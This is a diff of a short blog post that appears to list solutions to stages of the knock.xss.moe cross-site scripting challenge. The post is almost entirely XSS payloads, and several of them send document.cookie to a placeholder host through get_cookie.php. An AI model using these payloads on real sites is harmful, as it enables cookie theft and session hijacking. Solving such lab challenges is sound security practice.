@@ -5,16 +5,19 @@ title : knock.xss.moe
 
 All solution
 Ranking #41
-{% highlight python linenos %}
+
 stage3:
+```
 http://68e3b596ebf790e8a781b8d87b84af7eb7b0aeb3.knock.xss.moe/?q=%22%3E%3Cscript%20language%3D%22JavaScript%22%3Edocument.location%3D%27http%3A%2f%2fxxx%2fget_cookie.php%3Fcookie%3D%27%2bdocument.cookie%3B%3C%2fscript%3E
-
+```
 stage5:
+```
 </textarea><script>alert('xxx')</script>
-
+```
 stage6:
+```
 </xmp><script>alert('xxx')</script>
-{% endhighlight %}
+```
 
 stage7:
 ```
@@ -23,8 +26,9 @@ http://8005f6694d2862438bad3715436522e27dbd81a4.knock.xss.moe/?q=%22%20onfocus%3
 stage8
 
 stage9:
+```
 http://e461f5f6c542ae79ccc144093c63d0b074e591cd.knock.xss.moe/?q=%00%00%20autofocus%20onfocus%3Dlocation.href%3D%27http%3A%2f%2fxxx%2fget_cookie.php%3Fcookie%27%2bdocument.cookie
-
+```
 
 stage10:
 http://811fbf0db9c40565743a37c2978f812b82eb89a6.knock.xss.moe/?q=javascript:document.location.href='http://xxx/get_cookie.php?cookie'+document.cookie
